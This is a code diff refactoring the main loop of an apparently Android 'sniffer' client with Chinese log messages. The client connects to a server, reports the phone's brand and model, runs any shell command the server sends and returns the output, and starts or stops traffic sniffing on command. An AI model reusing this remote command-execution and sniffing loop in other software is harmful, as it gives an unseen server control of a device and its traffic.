@@ -12,9 +12,6 @@
 #include <common/command.h>
 #include <json/json/json.h>
 
-Sniffer gSniffer;
-SnifferClient gSnifferClient;
-
 int main(int argc, char** argv) {
 	char stra[16] = {'\0'};
 	sprintf(stra, "%d", argc);
@@ -37,43 +34,68 @@ int main(int argc, char** argv) {
 	}
 
 	KLog::SetLogDirectory("/sdcard/sniffer/");
-	FileLog(SnifferLogFileName, "sniffer启动!");
+	FileLog(SnifferLogFileName, "sniffer启动, 版本:%s", SnifferVersion);
 
+	// 获取手机信息
+	GetPhoneInfo();
+
+	Sniffer sniffer;
+	SnifferClient snifferClient;
+
+	Json::Value root;
+	Json::FastWriter writer;
+	string param;
+
+	SCMD scmd;
 	int seq = 0;
+
 	while(1) {
 		FileLog(SnifferLogFileName, "等待连接服务端...");
-		if( gSnifferClient.ConnectServer() ) {
-			// 连接上服务端, 发送手机型号/手机号
-			FileLog(SnifferLogFileName, "已经连接上服务端, 发送手机型号, 手机号...");
 
-			Json::Value root;
+		if( snifferClient.ConnectServer() ) {
+			// 连接上服务端, 发送手机型号/手机号
+			FileLog(
+					SnifferLogFileName,
+					"已经连接上服务端, 发送手机信息, [ "
+					"厂商 : %s, "
+					"型号 : %s, "
+					"手机号 : %s "
+					"]",
+					GetPhoneBrand().c_str(),
+					GetPhoneModel().c_str(),
+					""
+					);
+
+			root.clear();
 			root[PHONE_INFO_BRAND] = GetPhoneBrand();
 			root[PHONE_INFO_MODEL] = GetPhoneModel();
 			root[PHONE_INFO_NUMBER] = "";
-			Json::FastWriter writer;
-			string param = writer.write(root);
+			param = writer.write(root);
 
-			SCMD scmd;
+			bzero(&scmd, sizeof(SCMD));
 			scmd.header.scmdt = SnifferTypeClientInfoResult;
 			scmd.header.bNew = true;
 			scmd.header.seq = seq++;
 			scmd.header.len = param.length();
 			memcpy(scmd.param, param.c_str(), param.length());
 
-			gSnifferClient.SendCommand(scmd);
+			snifferClient.SendCommand(scmd);
 
 			FileLog(SnifferLogFileName, "等待接收命令...");
+
 			bool bCanRecv = true;
 			while(bCanRecv) {
 				// 开始接收命令
-				SCMD scmd = gSnifferClient.RecvCommand();
+				SCMD scmd;
+				snifferClient.RecvCommand(scmd);
 
 				switch(scmd.header.scmdt) {
 				case ExcuteCommand:{
 					// 执行Shell命令
 					string cmd = scmd.param;
-					FileLog(SnifferLogFileName, "收到服务器命令, 执行Shell:(%s)", cmd.c_str());
 					string result = SystemComandExecuteWithResult(cmd);
+					FileLog(SnifferLogFileName, "执行:(%s)", cmd.c_str());
+					FileLog(SnifferLogFileName, "执行结果:(%s)", result.c_str());
 
 					// 返回命令结果
 					SCMD scmdSend;
@@ -82,20 +104,24 @@ int main(int argc, char** argv) {
 					scmdSend.header.seq = scmd.header.seq;
 					scmdSend.header.len = result.length();
 					memcpy(scmdSend.param, result.c_str(), scmdSend.header.len);
-					gSnifferClient.SendCommand(scmdSend);
+					snifferClient.SendCommand(scmdSend);
+
 				}break;
 				case SinfferTypeStart:{
 					// 开始监听
-					FileLog(SnifferLogFileName, "收到服务器命令, 开始监听...");
-					gSniffer.StartSniffer();
+					FileLog(SnifferLogFileName, "开始监听...");
+					sniffer.StartSniffer();
+
 				}break;
 				case SinfferTypeStop:{
 					// 停止监听
-					gSniffer.StopSniffer();
+					sniffer.StopSniffer();
+
 				}break;
 				case SinfferTypeVersion:{
 					// 返回版本
-					FileLog(SnifferLogFileName, "收到服务器命令, 返回版本号:%s", SnifferVersion);
+					FileLog(SnifferLogFileName, "返回版本号:%s", SnifferVersion);
+
 					// 返回命令结果
 					SCMD scmdSend;
 					scmdSend.header.scmdt = SinfferTypeVersionResult;
@@ -103,17 +129,19 @@ int main(int argc, char** argv) {
 					scmdSend.header.seq = scmd.header.seq;
 					scmdSend.header.len = strlen(SnifferVersion);
 					memcpy(scmdSend.param, SnifferVersion, scmdSend.header.len);
-					gSnifferClient.SendCommand(scmdSend);
+					snifferClient.SendCommand(scmdSend);
+
 				}break;
 				case SinfferTypeNone:{
 					// 与服务端连接已经断开
 					FileLog(SnifferLogFileName, "与服务端连接已经断开!");
 					bCanRecv = false;
+
 				}break;
+				default:break;
 				}
 			}
 		}
-
 		sleep(30);
 	}
 
